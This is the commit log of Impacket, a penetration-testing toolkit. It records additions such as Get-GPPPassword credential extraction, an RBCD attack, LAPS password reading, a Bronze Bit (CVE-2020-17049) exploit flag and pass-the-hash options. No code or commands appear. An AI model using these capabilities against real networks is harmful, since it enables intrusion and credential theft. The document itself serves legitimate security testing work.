commit 0d3a6143300c6ac3eb1e7e9c6837794a29b187a1
Merge: 2f5c2476 8da84f7e
Author: 0xdeaddood <56035084+0xdeaddood@users.noreply.github.com>
Date:   Thu May 27 19:48:57 2021 -0300

    Merge pull request #1085 from p0dalirius/fix-get-gpppassword
    
    Fixing SessionError in Get-GPPPassword.py

commit 7dd6abb75df0a41aeaf04974de999bdce5e1ac7f
Author: 0xdeaddood <leandrocuozzo@hotmail.com>
Date:   Thu May 27 17:01:24 2021 -0300

    Fix error when -silentcommand is not used

commit d96b838ede67fbd49bc38962d20889305aafdd4d
Merge: 04d09b0e 2f5c2476
Author: 0xdeaddood <leandrocuozzo@hotmail.com>
Date:   Thu May 27 17:01:01 2021 -0300

    Merge branch 'master' into pr-605-catchup
    
    # Conflicts:
    #       examples/dcomexec.py
    #       examples/wmiexec.py

commit 9d646406cda0a7957ee5c6006e56acbee3c71857
Author: Podalirius <79218792+p0dalirius@users.noreply.github.com>
Date:   Tue May 25 16:48:31 2021 +0200

    Update Get-GPPPassword.py

commit 986102e5b070c83108f4e1be620efb52887957f9
Author: Podalirius <79218792+p0dalirius@users.noreply.github.com>
Date:   Tue May 25 16:45:48 2021 +0200

    Added single XML file parsing on Get-GPPPassword

commit 8da84f7e5017c7dbc60a2cf589818609c82a7ce5
Author: Podalirius <79218792+p0dalirius@users.noreply.github.com>
Date:   Tue May 25 15:03:34 2021 +0200

    Fixing SessionError in Get-GPPPassword.py
    
    Fixing smbconnection.SessionError when accessing forbidden directories in Get-GPPPassword.py

commit 2f5c24760d57ec9b1c3a6f67ea32792dcb939b9a
Merge: 7c21156a 2e16ba01
Author: 0xdeaddood <56035084+0xdeaddood@users.noreply.github.com>
Date:   Wed May 19 17:09:00 2021 -0300

    Merge pull request #1076 from AdamCrosser/master
    
    Additional LDAP Interactive Shell Features

commit 7c21156a67bb9f19e7181da216f36721f0d940f7
Merge: 6c854dac 6118e9db
Author: 0xdeaddood <56035084+0xdeaddood@users.noreply.github.com>
Date:   Wed May 19 12:18:26 2021 -0300

    Merge pull request #1064 from ShutdownRepo/get-gpppassword
    
    Added Get-GPPPassword

commit 6c854dacd8502943bd38d40779819af5d6734722
Author: 0xdeaddood <56035084+0xdeaddood@users.noreply.github.com>
Date:   Wed May 19 12:16:33 2021 -0300

    Update requirements in setup.py

commit 243ce175cdf357768471fcc37ca7290a09108934
Merge: 2e3cd7cd c2749e47
Author: 0xdeaddood <56035084+0xdeaddood@users.noreply.github.com>
Date:   Wed May 19 11:41:28 2021 -0300

    Merge pull request #1019 from mxrch/master
    
    Added cat command to smbclient

commit 2e3cd7cd7da738914df9df315ee0d2dca98945a6
Author: Martin Gallo <mgallo@secureauth.com>
Date:   Tue May 18 12:02:45 2021 -0300

    Tests: Removed some deprecation warnings (#1070)
    
    Replaced some test alias that were deprecated long time ago and were showing some warnings in our tests:
    
    - `assert_` with `assertTrue`
    - `assertEquals` with `assertEqual`

commit e0ea098ee5fc727a15392aca81db1383fdb74592
Merge: a0612f00 7d084049
Author: 0xdeaddood <56035084+0xdeaddood@users.noreply.github.com>
Date:   Tue May 18 10:26:20 2021 -0300

    addcomputer.py: Enable the machine account created via SAMR.
    
    After adding a computer over SMB, the machine account is created but is disabled by default.
    
    This PR:
    - Enables the machine account using the SamrSetInformationUser2 method as detailed in [MS-SAMR] Section 4.2.
    
    It fixes #667 (comment)

commit e726161736b6d2bd1ea43ce535b163a8d5514b71
Author: Martin Gallo <mgallo@secureauth.com>
Date:   Tue May 18 06:20:10 2021 -0700

    Setup: Using our own recommended pip calls

commit 7d084049ad7adb9c0b137fe073d903be0c14052a
Author: 0xdeaddood <leandrocuozzo@hotmail.com>
Date:   Mon May 17 22:07:33 2021 -0300

    Enable the machine account created via SAMR in addcomputer.py

commit a0612f006b1bf5089d5c27661f595f55b3604982
Merge: 24a0ae6f 4cf864f2
Author: 0xdeaddood <56035084+0xdeaddood@users.noreply.github.com>
Date:   Mon May 17 12:30:49 2021 -0300

    Merge pull request #1060 from nuschpl/master
    
    more universal approach, especially on OSX with homebrew where pip3 a…

commit 2e16ba010e92c5e0de9b26f76319321a1061d2c8
Merge: 9d484a83 48ee1050
Author: Adam Crosser <adam.crosser@praetorian.com>
Date:   Mon May 10 17:40:13 2021 -0500

    Merge branch 'master' of github.com:AdamCrosser/impacket

commit 9d484a83dfa2aa973ba86da021c599653fa4318e
Author: Adam Crosser <adam.crosser@praetorian.com>
Date:   Mon May 10 17:40:05 2021 -0500

    Remove SMBClient Change

commit 48ee10507a1fdeeba367016a1cb82e73835c2324
Author: AdamCrosser <45573557+AdamCrosser@users.noreply.github.com>
Date:   Mon May 10 17:38:29 2021 -0500

    Delete ldap_shell.py

commit 1595bd369415589b3b1aff31e1392a4b38bebe04
Author: Adam Crosser <adam.crosser@praetorian.com>
Date:   Mon May 10 17:14:44 2021 -0500

    Updated Help Menu

commit 5874558db403d1da7524fd71e533e366eaa2fc6b
Author: Adam Crosser <adam.crosser@praetorian.com>
Date:   Mon May 10 17:12:00 2021 -0500

    Added Add Computer Command

commit 940c4e572b726492e7b5d7952e47896fbb10df72
Author: Adam Crosser <adam.crosser@praetorian.com>
Date:   Mon May 10 16:27:49 2021 -0500

    LAPS Password Reading Capability

commit cd9965b2598f1a2580fc7c7180d929e2eff82d65
Author: Adam Crosser <adam.crosser@praetorian.com>
Date:   Mon May 10 09:48:40 2021 -0500

    Added Input Validation to set_rbcd Command

commit 2546e4527aca91b1b9da18e514b2668101f8a55b
Author: Francisco Ferrari Bihurriet <francisco.ferrari@helpsystems.com>
Date:   Sat May 8 04:26:50 2021 -0300

    Improve wmipersist.py error checking
    
    This improves wmipersist.py error checking by considering the right sign of the error code and trying to resolve it as a WBEM error, in order to get a more meaningful failure message
    
    Before error samples:
    [-] Adding FilterToConsumerBinding - ERROR (0x-7ffbeff1)
    [-] Removing EventFilter EF_NonExisting - ERROR (0x-7ffbeffe)
    
    After error samples:
    [-] Adding FilterToConsumerBinding - ERROR: WBEM_E_INVALID_OBJECT (0x8004100f)
    [-] Removing EventFilter EF_NonExisting - ERROR: WBEM_E_NOT_FOUND (0x80041002)

commit 2fefb9d60174ba7d34233bd33bc83cf59e6cc5cf
Author: Francisco Ferrari Bihurriet <francisco.ferrari@helpsystems.com>
Date:   Sat May 8 00:59:14 2021 -0300

    Set the default_value_is_inherited flag when the property is inherited
    
    In contrast with d0d5ad5e940129847b9330773d722040ed6b1bb2, this does change the behaviour for the ndTable flags. If we know the fact that the current property is inherited, and we are setting it as a null default, also set it as an inherited default.

commit 96027921230642cab989d718e40ffce1248ebfea
Author: Francisco Ferrari Bihurriet <francisco.ferrari@helpsystems.com>
Date:   Sat May 8 00:22:24 2021 -0300

    Extend comments about CIM_TYPE_OBJECT not yet implemented properties
    
    This is what I understand about why we set the default_value_is_inherited flag in the ndTable for CIM_TYPE_OBJECT properties, which we don't currently implement: to increase the chance that this value is filled from a parent class, since we aren't providing one.

commit d0d5ad5e940129847b9330773d722040ed6b1bb2
Author: Francisco Ferrari Bihurriet <francisco.ferrari@helpsystems.com>
Date:   Fri May 7 23:06:10 2021 -0300

    Refactor null and default flags table values
    
    This change doesn't affect behaviour, it just adds more semantic to the flags we are setting. It also removes the comments with text from Microsoft documentation (1), since this is self-documented by __ndEntry() parameters now.
    
    (1): https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-wmio/ed436785-40fc-425e-ad3d-f9200eb1a122

commit e3e9af93240fd1d9da2156a4832ef8133742d100
Author: Adam Crosser <adam.crosser@praetorian.com>
Date:   Fri May 7 17:27:30 2021 -0500

    RBCD Attack

commit 5b83608ff1b659fe44d41e1fb976e238cf613819
Author: Adam Crosser <adam.crosser@praetorian.com>
Date:   Fri May 7 10:13:17 2021 -0500

    Updated LDAP Shell

commit 06af814e78fd3f8adfb7025154c471f005f0c426
Author: Jonathan <w0rmh013@users.noreply.github.com>
Date:   Wed May 5 08:53:08 2021 +0300

    Fixed wrong Enum type when dumping credential blob

commit 24a0ae6f7298a8245560e1144788b6fc49928a41
Merge: f0668f3e e59ff693
Author: 0xdeaddood <56035084+0xdeaddood@users.noreply.github.com>
Date:   Tue May 4 12:36:29 2021 -0300

    Merge pull request #913 from Rcarnus/httpServerFixes
    
    httpRelayServer: read body content for POST requests

commit f0668f3ee691b6ec60cda4b580b17cdf97b2aa88
Author: Martin Gallo <mgallo@secureauth.com>
Date:   Mon May 3 15:28:39 2021 -0300

    Added SimpleSMBServer tests (#1067)
    
    Adding some pseudo-functional tests for the `SimpleSMBServer`. This spins up a `SimpleSMBServer` instance and connects to it using our own `SMBConnection`. Includes checks for #1066.
    
    This PR:
    - Adds basic unit tests for the path validation function introduced in #1066.
    - Adds pseudo-functional tests for `SimpleSMBServer`, checking login, list, get and put calls.

commit 49c643bf66620646884ed141c94e5fdd85bcdd2f
Merge: 91902eaf 6688da5d
Author: 0xdeaddood <56035084+0xdeaddood@users.noreply.github.com>
Date:   Mon May 3 12:43:02 2021 -0300

    Merge pull request #1066 from omriinbar/master
    
    Fix Path Traversal vulnerabilities by checking path prefix against in…

commit 91902eafb68fea932cf2350cab329f15afa554e5
Author: Martin Gallo <mgallo@secureauth.com>
Date:   Fri Apr 30 17:28:29 2021 -0300

    wmipersist.py: Fixed filterBinding error (#1069)
    
    * Sets the `filterBinding.DeliveryQoS` to `0` when defining the filterBinding in `wmipersist.py` example script.

commit 6118e9db2a4e34af71b72768bb82e68d86023853
Author: Shutdown <40902872+ShutdownRepo@users.noreply.github.com>
Date:   Thu Apr 29 21:58:53 2021 +0200

    Update examples/Get-GPPPassword.py
    
    Co-authored-by: 0xdeaddood <56035084+0xdeaddood@users.noreply.github.com>

commit 0b6f3a049203f8941cb1e76db5a798b067d8f0a0
Author: Shutdown <40902872+ShutdownRepo@users.noreply.github.com>
Date:   Thu Apr 29 21:58:48 2021 +0200

    Update examples/Get-GPPPassword.py
    
    Co-authored-by: 0xdeaddood <56035084+0xdeaddood@users.noreply.github.com>

commit fc72ebad86c74a4ff45c2a0172dc77328d4d3f2f
Merge: cb6d43a6 fd1d0ea9
Author: 0xdeaddood <56035084+0xdeaddood@users.noreply.github.com>
Date:   Tue Apr 27 17:47:42 2021 -0300

    Merge pull request #1044 from zexusx26/user_can_select_comversion
    
    User can select comversion #1031

commit 6688da5d97592269aae72b3a00dc1ab186c0b33d
Author: OmriI <omri.inbar@checkmarx.com>
Date:   Mon Apr 26 20:02:57 2021 +0300

    Changed STATUS_ACCESS_DENIED and STATUS_NOT_SUPPORTED to STATUS_OBJECT_PATH_SYNTAX_BAD

commit fd1d0ea9a675d120cc8431f10806ebb88daa96d6
Merge: 900b0f4a cb6d43a6
Author: Yaroslav Kataev <35561605+zexusx26@users.noreply.github.com>
Date:   Mon Apr 26 08:20:43 2021 +0500

    Merge branch 'master' into user_can_select_comversion

commit 900b0f4a7cadd803ece98a55e8d25311763fe521
Author: Yaroslav Kataev <35561605+zexusx26@users.noreply.github.com>
Date:   Mon Apr 26 07:51:17 2021 +0500

    Update impacket/dcerpc/v5/dcomrt.py
    
    Co-authored-by: 0xdeaddood <56035084+0xdeaddood@users.noreply.github.com>

commit e0cf5a0dcdf60198ae2232331bef1456b570044d
Author: Yaroslav Kataev <35561605+zexusx26@users.noreply.github.com>
Date:   Mon Apr 26 07:51:11 2021 +0500

    Update examples/wmiquery.py
    
    Co-authored-by: 0xdeaddood <56035084+0xdeaddood@users.noreply.github.com>

commit b20aea22b15ee365e57bcb1446743f2449cf91cb
Author: Yaroslav Kataev <35561605+zexusx26@users.noreply.github.com>
Date:   Mon Apr 26 07:51:01 2021 +0500

    Update examples/wmiquery.py
    
    Co-authored-by: 0xdeaddood <56035084+0xdeaddood@users.noreply.github.com>

commit 4696059e7e4fd642d0b8ff32d5635b9b2bd30bdf
Author: Yaroslav Kataev <35561605+zexusx26@users.noreply.github.com>
Date:   Mon Apr 26 07:50:56 2021 +0500

    Update examples/wmipersist.py
    
    Co-authored-by: 0xdeaddood <56035084+0xdeaddood@users.noreply.github.com>

commit dc699d3d0ff27ecb64a38681f1295a5a95d8d4ae
Author: Yaroslav Kataev <35561605+zexusx26@users.noreply.github.com>
Date:   Mon Apr 26 07:50:53 2021 +0500

    Update examples/wmipersist.py
    
    Co-authored-by: 0xdeaddood <56035084+0xdeaddood@users.noreply.github.com>

commit 7bdfdd9c6ec31f28e88d2feec2fd8df7982a6bcd
Author: Yaroslav Kataev <35561605+zexusx26@users.noreply.github.com>
Date:   Mon Apr 26 07:50:49 2021 +0500

    Update examples/wmiexec.py
    
    Co-authored-by: 0xdeaddood <56035084+0xdeaddood@users.noreply.github.com>

commit f76d2ba5091ae78793fd3403fa48c7b1258a258e
Author: Yaroslav Kataev <35561605+zexusx26@users.noreply.github.com>
Date:   Mon Apr 26 07:50:43 2021 +0500

    Update examples/wmiexec.py
    
    Co-authored-by: 0xdeaddood <56035084+0xdeaddood@users.noreply.github.com>

commit 1ab0aa40a6b18cc20e8addd25218c0d20b27aee5
Author: Yaroslav Kataev <35561605+zexusx26@users.noreply.github.com>
Date:   Mon Apr 26 07:50:37 2021 +0500

    Update examples/dcomexec.py
    
    Co-authored-by: 0xdeaddood <56035084+0xdeaddood@users.noreply.github.com>

commit df11c391baf84f5410cb7a17206cf44b5abadfaa
Author: Yaroslav Kataev <35561605+zexusx26@users.noreply.github.com>
Date:   Mon Apr 26 07:50:24 2021 +0500

    Update examples/dcomexec.py
    
    Co-authored-by: 0xdeaddood <56035084+0xdeaddood@users.noreply.github.com>

commit 99bd29e3995c254e2d6f6c2e3454e4271665955a
Author: OmriI <omri.inbar@checkmarx.com>
Date:   Sun Apr 25 14:06:02 2021 +0300

    Fix Path Traversal vulnerabilities by checking path prefix against incoming filename

commit cb6d43a677c338db930bc4e9161620832c1ec624
Author: Martin Gallo <mgallo@secureauth.com>
Date:   Thu Apr 22 17:43:00 2021 -0300

    Moved docker container to Python 3.8 (#1057)
    
    Using Python 3.8 Alpine-based as our base image for the default Docker build, as we're slowly trying to move away from Python 2.7. This increases the image size a little bit due to a new Rust dependency needed to have `cryptography` running in Alpine (see https://cryptography.io/en/latest/installation/#alpine).
    
    This PR:
    - Changes the base image to `python:3.8-alpine`.
    - Adds dependencies needed to have `cryptography` running in Alpine.

commit 019dcc9476d9764adc77dcab02d6d0a1a6fb2167
Author: 0xdeaddood <leandrocuozzo@hotmail.com>
Date:   Thu Apr 22 16:37:15 2021 -0300

    Fix the key version number (kvno) assignment

commit a45f331360ce2abdb1c517a35a1c407725b0d761
Author: Martin Gallo <mgallo@secureauth.com>
Date:   Thu Apr 22 10:02:29 2021 -0300

    Refactored the credentials parsing functions (#1058)
    
    Similar to and on top of #1053, this moves the credentials/account parsing regex to an utils module and reduces duplicated code in example scripts.
    
    The expected credential format is:
    `<DOMAIN></USERNAME><:PASSWORD>`
    
    Note that the regular expression used in `exchanger.py` was different (excluded ':' from the hostname) but I didn't found any reason to keep it different from all other scripts.
    
    This PR:
    - Moved credentials parsing routine to an utils module.
    - Added unit tests for the new function.
    - Using the new function across example scripts that accept a credential/account.

commit adb230256d1295fdb6c50a43a40fc43165901a3b
Author: Martin Gallo <mgallo@secureauth.com>
Date:   Thu Apr 22 09:11:33 2021 -0300

    Refactored the target parsing functions (#1053)
    
    In reviewing #1051 (and related #347) we found out that there's some ugly duplicated code that's better suited for an utils function.
    
    The expected target format is:
    `<DOMAIN></USERNAME><:PASSWORD>@HOSTNAME`
    
    This PR:
    - Moved target parsing routine to an utils module.
    - Added unit tests for the new function.
    - Using the new function across example scripts that accept a target.

commit fea485d2e4a53e9c26c02678237df1fc6621b5f4
Author: Martin Gallo <mgallo@secureauth.com>
Date:   Wed Apr 21 10:08:25 2021 -0300

    Attempt to fix Python 3.9 compatibility issue with Thread.is_alive (#1061)
    
    As mentioned in #946 and #1054, one unit test of the `ImpactPacket` suite was using the `isAlive` method which was already deprecated in Python 3.8, and removed in Python 3.9. This changes its use to `is_alive`, introduced back in Python 2.6!

commit feacde109b329bcfca13fd7e4c77972eff3c1bdb
Author: Shutdown <nwodtuhs+github@pm.me>
Date:   Wed Apr 21 13:40:24 2021 +0200

    Added Get-GPPPassword
    Added Get-GPPPassword in examples. It's a python script for extracting and decrypting Group Policy Preferences passwords using streams for treating files instead of mounting shares, allowing for running this script inside regular docker containers. This also allows for pass-the-hash, pass-the-ticket, pass-the-key, overpass-the-hash, features that the Metasploit Framework doesn't offer.

commit 4e64bb0aca9f413385dcd49c267d08c31ba3d493
Author: Shutdown <nwodtuhs+github@pm.me>
Date:   Wed Apr 21 13:38:52 2021 +0200

    User-defined password for LDAP attack addComputer
    - users can now define a custom password for the LDAP attack addComputer
    - edited the random generation of passwords for addComputer and addUser in order to remove some inconvenient special chars like quotes

commit 4cf864f2e076df89267130864d8cc278392c3173
Author: nusch <nusch@xps13>
Date:   Tue Apr 20 08:20:00 2021 +0200

    more universal approach, especially on OSX with homebrew where pip3 and python3 may point often to different locations of modules

commit f9453d21e986a0c01a56254dffe4bfbe333f8ea0
Author: Martin Gallo <mgallo@secureauth.com>
Date:   Mon Apr 19 16:53:26 2021 -0300

    Fixed Ping examples (#1059)
    
    While reviewing #1054, we found that ping examples where using old strings instead of bytes as payloads, and this is breaking in Python >2.

commit eaaaf46ba7c327d46acea9d294e51d86e96a6bbc
Author: Martin Gallo <mgallo@secureauth.com>
Date:   Mon Apr 19 11:58:34 2021 -0700

    Fix Python 3 compat issue with ImpactPacket validate index
    
    After working on #1054 and moving to use frombytes/tobytes we found a Python 3 compat issue with bytes/string in PacketBuffer __validate_index. This fixes a wrong use of a string instead of bytes.

commit 80b02561b43812a00ec2a9c739f01c96c1a3b650
Author: Martin Gallo <mgallo@secureauth.com>
Date:   Mon Apr 19 11:07:54 2021 -0700

    Proper use of array_tobytes missing from #1054
    
    Small change for properly use the array_tobytes function.

commit 976d39a14aa3fa8b13b7eea9560ac6158bf2b637
Author: Martin Gallo <mgallo@secureauth.com>
Date:   Mon Apr 19 14:57:43 2021 -0300

    Attempt to fix Python 3.9 compatibility issue with array.array tostring/fromstring methods (#1054)
    
    Python 3.9 removed the `array.array` `tostring` and `fromstring` methods (see https://docs.python.org/3/whatsnew/3.9.html#removed).
    Note that the `tostring` and `fromstring` methods were already deprecated since Python 3.2, but aliases to the new `tobytes` and `frombytes` were provided (see https://docs.python.org/3/library/array.html#array.array.tobytes).
    
    This:
    - Adds helper function to use `tostring` and `fromstring` in Python <3.2 versions and `tobytes` and `frombytes` in Python>=3.2.
    - Replaces uses of `tostring` and `fromstring` with the new helper function.

commit efbe78bb1f8b5f276881ce6b98ff9110c8faa598
Author: Martin Gallo <mgallo@secureauth.com>
Date:   Fri Apr 16 15:31:20 2021 -0300

    Added basic GitHub Actions workflow (#1055)
    
    As we were running with some issues with Travis (e.g. limited run minutes), we're adding GitHub Actions as a separate CI unit tests runner. Tests are executed via Tox in virtual environments so we should expect the same results as in Travis, although we're not yet replacing it at this point.
    
    * Adds a basic workflow that:
      * Runs flake8 for syntax errors and then runs non-remote unit tests using Tox.
      * Runs on Python 2.7, 3.6, 3.7, 3.8 and allows failures on 3.9 as we do in Travis.
    * Adds a job that just builds the contributed docker image to check it's not failing.

commit 73bf8cad094e2d9906af08aba7e1b38c83c226cb
Author: 0xdeaddood <leandrocuozzo@hotmail.com>
Date:   Thu Apr 15 20:17:42 2021 -0300

    Fix the target processor in ntlmrelayx
    
    It addresses #914

commit cf683c0da9c119486eb289021b79fbdf0c947917
Author: 0xdeaddood <leandrocuozzo@hotmail.com>
Date:   Thu Apr 15 17:08:54 2021 -0300

    Revert "Fix the target processor in ntlmrelayx"
    
    This reverts commit d9be6fbe1264a68e4bdb29542882d51eb9ab18e4.

commit d9be6fbe1264a68e4bdb29542882d51eb9ab18e4
Author: 0xdeaddood <leandrocuozzo@hotmail.com>
Date:   Thu Apr 15 16:46:39 2021 -0300

    Fix the target processor in ntlmrelayx

commit 634ea887e6d591a039bd2780995210b8681b9ec0
Author: Ярослав Катаев <yakataev@ussc.ru>
Date:   Mon Mar 22 18:49:40 2021 +0500

    User can select comversion #1031

commit a16198c3312d8cfe25b329907b16463ea3143519
Merge: 14578b53 b7a53d84
Author: 0xdeaddood <56035084+0xdeaddood@users.noreply.github.com>
Date:   Mon Mar 15 12:14:12 2021 -0300

    Merge pull request #1037 from snovvcrash/wmiexec-pwsh
    
    Add PowerShell option for semi-interactive shells in *exec.py

commit b7a53d8488308696d1e524a3c43b139e4bd909c3
Author: snovvcrash <snovvcrash@protonmail.ch>
Date:   Sat Mar 13 21:23:06 2021 +0300

    Fix PowerShell shell for MMC20 object
    
    Co-authored-by: 0xdeaddood <56035084+0xdeaddood@users.noreply.github.com>

commit cb9f7bf8f68ae98bd6e7c54c7bac51eb425a8851
Author: Sam Free5ide <snovvcrash@protonmail.ch>
Date:   Sat Mar 13 21:14:37 2021 +0300

    Rename get and put actions

commit 14578b53079645a94f965199c7d0c4796a31b2f0
Merge: 90b17109 9cb5df93
Author: 0xdeaddood <56035084+0xdeaddood@users.noreply.github.com>
Date:   Fri Mar 12 18:23:40 2021 -0300

    Merge pull request #1034 from snovvcrash/master
    
    Add Pass-the-Hash option for smbpasswd.py

commit 9cb5df934bad2f912367488e85d313e5e0469247
Author: snovvcrash <snovvcrash@protonmail.ch>
Date:   Thu Mar 11 21:45:37 2021 +0300

    Split arguments by groups

commit 8b0293e1742e7fc409f5b2b70c524c147d8db33c
Author: Sam Free5ide <snovvcrash@protonmail.ch>
Date:   Thu Mar 11 20:31:54 2021 +0300

    Add PowerShell option for semi-interactive shells

commit 90b171094cf7e2e0ebed071fe7cca647d3c78994
Merge: df00d15c 82c6d1f1
Author: 0xdeaddood <56035084+0xdeaddood@users.noreply.github.com>
Date:   Tue Mar 9 14:03:16 2021 -0300

    Merge pull request #1035 from snovvcrash/wmiexec-pwsh
    
    Add PowerShell option for semi-interactive shell in wmiexec.py

commit 82c6d1f16058dbe4f0acf8c3f68d10212063b4da
Author: Sam Free5ide <snovvcrash@protonmail.ch>
Date:   Tue Mar 9 13:48:26 2021 +0300

    Add PowerShell option for semi-interactive shell

commit 04d09b0e6374877096b81e36965f04dacdbd23a6
Merge: 78a219db df00d15c
Author: mreski <micheal@blacklanternsecurity.com>
Date:   Mon Mar 8 20:43:10 2021 -0500

    Merge branch 'master' of https://github.com/SecureAuthCorp/impacket

commit 52e174462c0ac8824f7f2fdd88d3b98455004e02
Author: Sam Free5ide <snovvcrash@protonmail.ch>
Date:   Mon Mar 8 18:11:38 2021 +0300

    Update description

commit 3ed44b2836ca8a7304badc0485d4148a4daa05fc
Author: Sam Free5ide <snovvcrash@protonmail.ch>
Date:   Sat Mar 6 21:12:18 2021 +0300

    Add Pass-the-Hash option

commit 0dfc99e9b42a7b3fa3edddae2c3b0a99bd6511b3
Author: Sam Free5ide <snovvcrash@protonmail.ch>
Date:   Sat Mar 6 20:05:46 2021 +0300

    Add Pass-the-Hash option

commit df00d15c82092a2a715ff1c191ea18f856d88314
Author: 0xdeaddood <leandrocuozzo@hotmail.com>
Date:   Tue Mar 2 13:01:23 2021 -0300

    Adding encryption type constant

commit f6ea291a57b86c5eea527695a3568cb7aaf568cb
Author: 0xdeaddood <leandrocuozzo@hotmail.com>
Date:   Tue Mar 2 12:37:32 2021 -0300

    Adding [MS-KILE] 2.2.11 and 2.2.12 pre-authentication types constants

commit 3f3002e1c1dd78a5ee6100d6824ff7b65bbb92b6
Author: Martin Gallo <mgallo@secureauth.com>
Date:   Fri Feb 12 14:39:25 2021 -0800

    Updating maintainer
    
    Using our OpenSource address as mantainer

commit e4904b0d5c513d605e661dd1c0c5d9629f4f4770
Author: asolino <bethus@gmail.com>
Date:   Tue Feb 9 17:02:24 2021 -0300

    Adding [MS-KILE] 2.2.11 and 2.2.12 structures

commit 3673c58885bc0c7bcba55bef8409cbb3029641a4
Author: asolino <bethus@gmail.com>
Date:   Wed Jan 27 14:10:11 2021 -0300

    Fixing Python3 issue when serving SOCKS5 requests
    
    - Should address https://github.com/SecureAuthCorp/impacket/issues/1025

commit 7100210f6f8bf312ea436cd3dc022077ee6b0b09
Merge: 08cc17d9 27ca93be
Author: Alberto Solino <asolino@users.noreply.github.com>
Date:   Mon Jan 11 16:22:20 2021 -0300

    Merge pull request #1017 from timgates42/bugfix_typo_getting
    
    docs: fix simple typo, gettting -> getting

commit 08cc17d931bc1d4fe9dfe19a2616f6d73068de35
Merge: 1dec03a4 49546f72
Author: Alberto Solino <asolino@users.noreply.github.com>
Date:   Mon Jan 11 16:21:12 2021 -0300

    Merge pull request #1020 from snovvcrash/bronze-bit
    
    Compute NTHash and AESKey for the Bronze Bit attack automatically

commit 1dec03a45d55edd16f7a3e4a3c59774ff997c26d
Merge: ac307704 31dfb9c4
Author: asolino <bethus@gmail.com>
Date:   Fri Jan 8 11:32:10 2021 -0300

    Merge branch 'snovvcrash-master'

commit 31dfb9c4b2077806bc7c7c77f686dfc968c0d750
Author: asolino <bethus@gmail.com>
Date:   Fri Jan 8 11:31:25 2021 -0300

    Adding banner and adjust date.

commit 5fd08c3e4aa3b37f74258e4d4a718f0397860877
Merge: ac307704 b7288fdd
Author: asolino <bethus@gmail.com>
Date:   Fri Jan 8 11:26:03 2021 -0300

    Merge branch 'master' of https://github.com/snovvcrash/impacket into snovvcrash-master

commit 49546f728d6a80112eaf3c5e43981cadcb92e759
Author: Sam Free5ide <snovvcrash@protonmail.ch>
Date:   Sat Dec 26 16:49:14 2020 +0300

    Compute NTHash and AESKey for Bronze Bit Attack

commit c2749e472c86850b4c993985ab0a90cb1fd08de4
Author: mxrch <17338428+mxrch@users.noreply.github.com>
Date:   Sat Dec 26 03:07:46 2020 +0100

    Added command description

commit e852343adfee6b66075d3c94510661ccf7fab03e
Author: mxrch <kvwaljam@protonmail.ch>
Date:   Sat Dec 26 02:50:15 2020 +0100

    Added cat command to smbclient

commit 27ca93be213e57ee34198392f306af6bfe851798
Author: Tim Gates <tim.gates@iress.com>
Date:   Thu Dec 24 15:52:55 2020 +1100

    docs: fix simple typo, gettting -> getting
    
    There is a small typo in impacket/examples/ntlmrelayx/servers/socksserver.py.
    
    Should read `getting` rather than `gettting`.

commit ac307704949a55c3619a2fb6c8369b974a226592
Merge: aa0c78ad eaaac860
Author: Alberto Solino <asolino@users.noreply.github.com>
Date:   Wed Dec 9 13:32:55 2020 -0300

    Merge pull request #1013 from jakekarnes42/master
    
    Exploit for CVE-2020-17049: new -force-forwardable flag for getST.py

commit eaaac860a9a57a5e97f033c85b2d4772facaa24a
Author: Jake Karnes <jake.karnes@gmail.com>
Date:   Tue Dec 8 12:10:07 2020 -0800

    Adding CVE-2020-17049 exploit
    
    See https://blog.netspi.com/cve-2020-17049-kerberos-bronze-bit-overview for an overview with links to deep dives into the vulnerability and exploit.

commit 81d1368cb621b7048d8d3d0a783cd5e9534e0dfe
Author: Jake Karnes <jake.karnes@gmail.com>
Date:   Tue Dec 8 12:08:45 2020 -0800

    Updating to handle missing "renew_till" value.
    
    After KB4586793 for CVE-2020-17049 the "renew_till" timestamp may be omitted from service tickets.

commit aa0c78ad7bd4fae11d765ed717e0f415c030f83e
Merge: fe239768 27089452
Author: Alberto Solino <asolino@users.noreply.github.com>
Date:   Thu Dec 3 12:55:20 2020 -0300

    Merge pull request #998 from jagotu/master
    
    NTLMrelayx HTTPRelayServer: Python 3.x

commit fe2397688b56b64877ce54c4dedd1f0799439e24
Merge: e1b9e247 e97aa3bd
Author: Alberto Solino <asolino@users.noreply.github.com>
Date:   Thu Dec 3 12:54:19 2020 -0300

    Merge pull request #1003 from mpgn/patch-1
    
    Fix encoding problem with smv1 connection #1002

commit e1b9e247de5b4514ea3f5b0229e8187d9e8142d4
Merge: f0a190af c4e4057b
Author: Alberto Solino <asolino@users.noreply.github.com>
Date:   Thu Dec 3 12:53:24 2020 -0300

    Merge pull request #1005 from mohemiv/iphlp
    
     Adding implementation of iphlpsvc.dll MSRPC calls

commit f0a190afb76c51f8080ec0bf7d4301f7a68adece
Merge: 04271a5d 84f00b22
Author: Alberto Solino <asolino@users.noreply.github.com>
Date:   Thu Dec 3 12:50:54 2020 -0300

    Merge pull request #995 from mohemiv/master
    
    Speeding up DcSync

commit 04271a5d4462a60b54d4b3e5a4755f20c8a2c24c
Merge: bb084df7 06cd1709
Author: Alberto Solino <asolino@users.noreply.github.com>
Date:   Thu Dec 3 12:46:13 2020 -0300

    Merge pull request #986 from vruello/rpc_smb_timeout
    
    Support connect timeout with SMBTransport

commit c4e4057b1bd0b412d661cdfe9ff04e6e4dbcc4fd
Author: Arseniy Sharoglazov <mohemiv@gmail.com>
Date:   Tue Dec 1 19:26:15 2020 +0300

    Fixing Travis CI tests

commit 21c2d73454c6f1e9938fa0221c69908c5dc9f6ec
Author: Arseniy Sharoglazov <mohemiv@gmail.com>
Date:   Tue Dec 1 19:16:08 2020 +0300

    Adding implementation of iphlpsvc.dll MSRPC calls

commit bb084df771f665b4de3b58b419643ed958cf8128
Author: asolino <bethus@gmail.com>
Date:   Sun Nov 29 16:13:26 2020 -0300

    Ignoring incoming NETBIOS_SESSION_KEEP_ALIVE requests
    
    - Per RFC 1002, we're discarding that packet.
    - We weren't, thus introducing an "Unexpected answer from server" exception

commit e97aa3bd52bfb650b9f792b6e178136867c36ee6
Author: mpgn <martial.puygrenier@gmail.com>
Date:   Sat Nov 28 01:16:59 2020 +0100

    Fix encoding problem with smv1 connection #1002

commit 18df212327d13fd83b8ee752bb63fa210c421e0a
Author: asolino <bethus@gmail.com>
Date:   Mon Nov 23 13:26:51 2020 -0300

    Adding offline CryptUnprotectData functionality
    
    - Thru the unprotect command.
